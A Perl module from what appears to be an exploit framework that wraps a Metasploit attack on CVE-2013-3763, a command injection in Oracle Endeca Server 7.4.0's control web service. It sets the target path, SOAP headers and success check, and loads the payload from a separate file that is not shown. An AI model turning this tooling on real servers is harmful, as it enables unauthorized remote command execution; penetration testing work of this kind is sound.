package MSFExploits::Exploits::ORACLE::MSF::OracleEndecaExec;
# use parent qw(MSFExploits::Exploit MSFExploits::Services::ORACLE);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

# # use MSFExploits::Functions::Basic;
# # use MSFExploits::Functions::Errors;
# # use MSFExploits::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "OracleEndecaExec";

   my $DETECTION = {

   };

my $EXPLOIT = {
  CVE => "CVE-2013-3763",
  DESCRIPTION => "

        This module exploits a command injection vulnerability on the Oracle Endeca

        Server 7.4.0. The vulnerability exists on the createDataStore method from the

        controlSoapBinding web service. The vulnerable method only exists on the 7.4.0

        branch and isn't available on the 7.5.5.1 branch. In addition, the injection

        has been found to be Windows specific. This module has been tested successfully

        on Endeca Server 7.4.0.787 over Windows 2008 R2 (64 bits).

      ",
  METHOD => "POST",
  MSF_MODULE => "oracle_endeca_exec",
  OSVDB => 95269,
  PATHS => ["ws/control"],
  REFERENCES => [
    "http://www.oracle.com/technetwork/topics/security/cpujuly2013-1899826.html",
  ],
  TITLE => "Oracle Endeca Server Remote Command Execution",
  VARIABLES => {
    'PATH' =>       {
  DESCRIPTION => "The URI path of the Control Web Service",
  VALUE => "/ws/control",
},
  },

  TYPE => 'MSF',
  PLATFORM => 'WINDOWS',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => '',
      PAYLOAD      => read_file('Exploits/ORACLE/MSF/src/OracleEndecaExec.payload', 1),
      TEXT   => 'Sending Exploit #1 Request : [POST] /',
      HEADERS      => {
        'SOAPAction' => '""',
        'Content-Type' => 'text/xml; charset=utf-8',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;
